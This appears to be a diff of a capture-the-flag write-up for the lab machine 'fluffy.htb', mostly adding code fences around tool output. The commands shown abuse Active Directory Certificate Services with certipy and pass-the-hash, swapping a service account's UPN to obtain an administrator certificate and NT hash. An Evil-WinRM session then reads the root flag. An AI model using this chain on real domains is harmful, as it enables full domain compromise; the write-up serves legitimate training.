@@ -2015,20 +2015,19 @@ Already have this from Rubeus
 ```python
 !certipy account update -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator
 ```
-
+```
     Certipy v4.8.2 - by Oliver Lyak (ly4k)
     
     [*] Updating user 'ca_svc':
         userPrincipalName                   : administrator
     [*] Successfully updated 'ca_svc'
-
-
+```
+Ran this twice after connection timeout
 
 ```python
-#Ran this twice after connection timeout
 !certipy req -u ca_svc@fluffy.htb -hashes :CA0F4F9E9EB8A092ADDF53BB03FC98C8 -ca fluffy-DC01-CA -target fluffy.htb
 ```
-
+```
     Certipy v4.8.2 - by Oliver Lyak (ly4k)
     
     [*] Requesting certificate via RPC
@@ -2037,25 +2036,25 @@ Already have this from Rubeus
     [*] Got certificate with UPN 'administrator'
     [*] Certificate has no object SID
     [*] Saved certificate and private key to 'administrator.pfx'
-
+```
 
 
 ```python
 !certipy account update -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc
 ```
-
+```
     Certipy v4.8.2 - by Oliver Lyak (ly4k)
     
     [*] Updating user 'ca_svc':
         userPrincipalName                   : ca_svc
     [*] Successfully updated 'ca_svc'
-
+```
 
 
 ```python
 !certipy auth -pfx administrator.pfx -domain fluffy.htb
 ```
-
+```log
     Certipy v4.8.2 - by Oliver Lyak (ly4k)
     
     [*] Using principal: administrator@fluffy.htb
@@ -2064,7 +2063,7 @@ Already have this from Rubeus
     [*] Saved credential cache to 'administrator.ccache'
     [*] Trying to retrieve NT hash for 'administrator'
     [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
-
+```
 
 
 To sum up the above, often certificate templates have weird permissions that let us either use them for unintended purposes (login instead of server auth as an example), maybe they allow bad groups to use the template (like low privilege users making machine accounts for domain joins), or in this case just allowing bad properties to be updated along with the template generation (like us using ca_svc to make a certificate signed as a different upn.).
@@ -2080,3 +2079,4 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
 6023a978f0e27fbd077c3ad09bf55fd4
+```
